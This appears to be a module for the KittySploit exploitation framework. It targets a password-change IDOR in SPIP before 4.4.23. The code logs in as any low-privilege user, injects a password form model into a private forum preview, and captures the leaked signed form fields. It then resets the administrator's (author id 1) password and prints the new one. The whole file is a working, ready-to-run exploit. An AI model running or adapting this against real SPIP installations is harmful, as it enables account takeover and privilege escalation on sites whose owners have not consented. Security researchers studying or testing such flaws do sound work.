#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SPIP < 4.4.23 password-change IDOR (signed form leak via forum preview)."""

from __future__ import annotations

import re
import secrets
from urllib.parse import urlencode

from kittysploit import *
from lib.protocols.http.http_client import Http_client

_CVT_ARGS = re.compile(
    r'name=["\']formulaire_action_args["\'][^>]*value=["\']([^"\']+)["\']',
    re.I,
)
_CVT_SIGN = re.compile(
    r'name=["\']formulaire_action_sign["\'][^>]*value=["\']([^"\']+)["\']',
    re.I,
)
_VERSION_RE = re.compile(r"SPIP\s+(\d+(?:\.\d+)+)", re.I)


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "SPIP password change IDOR",
        "description": (
            "SPIP before 4.4.23: inject <formulaire|mot_de_passe|id_auteur=N> into a "
            "forum preview to capture signed mot_de_passe fields and reset user 1."
        ),
        "author": ["KittySploit Team", "Julien Voisin", "0xkidz"],
        "references": [
            "https://blog.spip.net/Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-4-23.html",
        ],
        "tags": ["spip", "idor", "priv-esc", "auxiliary"],
        "agent": {
            "approval_required": True,
            "produces": ["credentials"],
            "chain": {"suggested_followups": ["scanner/http/spip_detect"]},
        },
    }

    username = OptString("", "Any SPIP account (subscriber+)", required=True)
    password = OptString("", "SPIP account password", required=True)

    _TARGET_AUTHOR_ID = 1

    def _join(self, suffix: str) -> str:
        base = (self.path or "/").rstrip("/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base else suffix

    def _cvt_fields(self, html: str, action: str) -> tuple[str, str]:
        if f'value="{action}"' not in html and f"value='{action}'" not in html:
            return "", ""
        args = _CVT_ARGS.search(html)
        sign = _CVT_SIGN.search(html)
        if not args or not sign:
            return "", ""
        return args.group(1), sign.group(1)

    def _spip_login(self) -> str:
        page = self.http_request(
            method="GET",
            path=self._join("/spip.php"),
            params={"page": "login"},
        )
        if not page:
            raise RuntimeError("login page unreachable")
        args, sign = self._cvt_fields(page.text or "", "login")
        if not args:
            raise RuntimeError("login CVT fields missing")
        post = self.http_request(
            method="POST",
            path=self._join("/spip.php"),
            params={"page": "login"},
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data=urlencode(
                {
                    "page": "login",
                    "formulaire_action": "login",
                    "formulaire_action_args": args,
                    "formulaire_action_sign": sign,
                    "var_login": str(self.username),
                    "password": str(self.password),
                }
            ),
            allow_redirects=True,
        )
        cookie = ""
        if post:
            cookie = post.headers.get("Set-Cookie", "")
        if hasattr(self, "session") and self.session:
            for c in self.session.cookies:
                if "spip_session" in c.name:
                    return ""
        if not post or "spip_session" not in cookie:
            raise RuntimeError("SPIP authentication failed")
        return cookie

    def run(self):
        home = self.http_request(method="GET", path=self._join("/spip.php"))
        ver_match = _VERSION_RE.search((home.text or "") if home else "")
        if ver_match:
            parts = tuple(int(x) for x in ver_match.group(1).split("."))
            if parts >= (4, 4, 23):
                print_error(f"SPIP {ver_match.group(1)} appears patched")
                return False
        try:
            cookie_hdr = self._spip_login()
        except RuntimeError as exc:
            print_error(str(exc))
            return False
        headers = {"Cookie": cookie_hdr} if cookie_hdr else {}
        model = f"<formulaire|mot_de_passe|id_auteur={self._TARGET_AUTHOR_ID}>"
        ecrire = self._join("/ecrire/")
        pre = self.http_request(
            method="GET",
            path=ecrire,
            params={"exec": "forum", "repondre": "new", "objet": "rubrique", "id_objet": "1"},
            headers=headers,
        )
        if not pre:
            print_error("Private forum unreachable")
            return False
        args, sign = self._cvt_fields(pre.text or "", "forum_prive")
        if not args:
            print_error("forum_prive CVT not found")
            return False
        title = secrets.token_hex(4)
        post = self.http_request(
            method="POST",
            path=ecrire,
            params={"exec": "forum", "repondre": "new", "objet": "rubrique", "id_objet": "1"},
            headers={**headers, "Content-Type": "application/x-www-form-urlencoded"},
            data=(
                f"formulaire_action=forum_prive&formulaire_action_args={args}"
                f"&formulaire_action_sign={sign}&texte={model}&titre={title}"
            ),
        )
        if not post:
            return False
        pargs, psign = self._cvt_fields(post.text or "", "mot_de_passe")
        if not pargs:
            print_error("mot_de_passe form not rendered")
            return False
        new_pass = secrets.token_urlsafe(14)
        change = self.http_request(
            method="POST",
            path=self._join("/spip.php"),
            headers={**headers, "Content-Type": "application/x-www-form-urlencoded"},
            data=(
                f"formulaire_action=mot_de_passe&formulaire_action_args={pargs}"
                f"&formulaire_action_sign={psign}&oubli={new_pass}"
                f"&oubli_confirm={new_pass}&nobot="
            ),
        )
        if not change or "reponse_formulaire_erreur" in (change.text or ""):
            print_error("Password change rejected")
            return False
        print_success(
            f"SPIP author id={self._TARGET_AUTHOR_ID} password set to: {new_pass}"
        )
        return True